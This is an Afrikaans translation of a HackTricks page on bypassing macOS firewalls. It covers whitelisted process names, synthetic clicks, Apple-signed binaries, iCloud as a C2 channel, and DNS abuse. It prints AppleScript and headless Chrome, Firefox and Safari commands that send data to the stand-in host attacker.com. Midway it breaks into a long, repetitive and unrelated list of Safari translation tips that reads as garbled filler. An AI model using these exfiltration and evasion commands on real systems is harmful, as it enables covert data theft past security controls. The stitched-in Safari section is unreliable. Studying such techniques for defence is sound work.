# macOS Deurloophardeware

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Gevonde tegnieke

Die volgende tegnieke is gevind om te werk in sommige macOS-firewalltoepassings.

### Misbruik van witlysname

* Byvoorbeeld om die kwaadwillige sagteware te noem met name van bekende macOS-prosesse soos **`launchd`**&#x20;

### Sintetiese Klik

* As die firewall toestemming van die gebruiker vra, laat die kwaadwillige sagteware **klik op toelaat**

### **Gebruik Apple-ondertekende binaêre lêers**

* Soos **`curl`**, maar ook ander soos **`whois`**

### Bekende Apple-domeine

Die firewall kan verbinding met bekende Apple-domeine soos **`apple.com`** of **`icloud.com`** toelaat. En iCloud kan as 'n C2 gebruik word.

### Generiese Deurloop

Sommige idees om deur firewalls te loop

### Kontroleer toegelate verkeer

Om die toegelate verkeer te ken, sal jou help om potensieel witlys-domeine te identifiseer of watter toepassings toegelaat word om daarmee te kommunikeer
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Misbruik van DNS

DNS-oplossings word gedoen deur die **`mdnsreponder`** ondertekende toepassing wat waarskynlik toegelaat sal word om kontak te maak met DNS-bedieners.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via Blaaier-toepassings

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# Safari

Safari is 'n webblaaier wat standaard op macOS geïnstalleer is. Dit kan gebruik word om webwerwe te besoek en aanlyninhoud te sien. Hier is 'n paar nuttige wenke en truuks om Safari te gebruik:

- **Bladsyvertaling**: Safari het 'n ingeboude vertalingsfunksie wat jou kan help om webbladsye in 'n ander taal te vertaal. Klik eenvoudig op die vertalingsknoppie in die adresbalk en kies die gewenste taal.

- **Bladsy-eksklusie**: As jy nie wil hê dat 'n sekere webbladsy vertaal moet word nie, kan jy dit uitsluit van die vertalingsproses. Klik op die vertalingsknoppie en kies "Uitsluit hierdie bladsy" om die vertaling te verhoed.

- **Bladsyvertaling uitskakel**: As jy nie die vertalingsfunksie in Safari wil gebruik nie, kan jy dit uitskakel. Gaan na Safari-voorkeure, klik op die "Weergawe" -bladsy en skakel die "Vertalingsfunksie" af.

- **Bladsy-eksklusie ongedaan maak**: As jy 'n webbladsy uitgesluit het van vertaling en jy wil dit weer insluit, klik op die vertalingsknoppie en kies "Sluit hierdie bladsy in".

- **Bladsyvertalingstale**: Jy kan die voorkeurvertalingstale in Safari instel. Gaan na Safari-voorkeure, klik op die "Weergawe" -bladsy en kies die gewenste tale in die "Vertalingsfunksie" -afdeling.

- **Bladsyvertalingstale prioriteite**: As jy wil hê dat Safari sekere tale voor ander vertaal, kan jy die prioriteite van die vertalingstale instel. Gaan na Safari-voorkeure, klik op die "Weergawe" -bladsy en rangskik die tale in die "Vertalingsfunksie" -afdeling volgens jou voorkeur.

- **Bladsyvertaling uitskakel vir 'n spesifieke webwerf**: As jy nie wil hê dat Safari 'n spesifieke webwerf vertaal nie, kan jy dit uitskakel. Klik op die vertalingsknoppie terwyl jy op die webwerf is en kies "Uitsluit hierdie webwerf".

- **Bladsyvertaling uitskakel vir alle webwerwe**: As jy nie wil hê dat Safari enige webwerf vertaal nie, kan jy dit uitskakel. Gaan na Safari-voorkeure, klik op die "Weergawe" -bladsy en skakel die "Vertalingsfunksie" af.

- **Bladsyvertaling uitskakel vir 'n spesifieke taal**: As jy nie wil hê dat Safari 'n spesifieke taal vertaal nie, kan jy dit uitskakel. Gaan na Safari-voorkeure, klik op die "Weergawe" -bladsy en skakel die betrokke taal af in die "Vertalingsfunksie" -afdeling.

- **Bladsyvertaling uitskakel vir 'n spesifieke webwerf en taal**: As jy nie wil hê dat Safari 'n spesifieke webwerf en taal vertaal nie, kan jy dit uitskakel. Klik op die vertalingsknoppie terwyl jy op die webwerf is en kies "Uitsluit hierdie webwerf en taal".
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via prosesinjeksies

As jy **kode kan inspuit in 'n proses** wat toegelaat word om met enige bediener te verbind, kan jy die vuurmuurbeveiliging omseil:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Verwysings

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repositoriums.

</details>
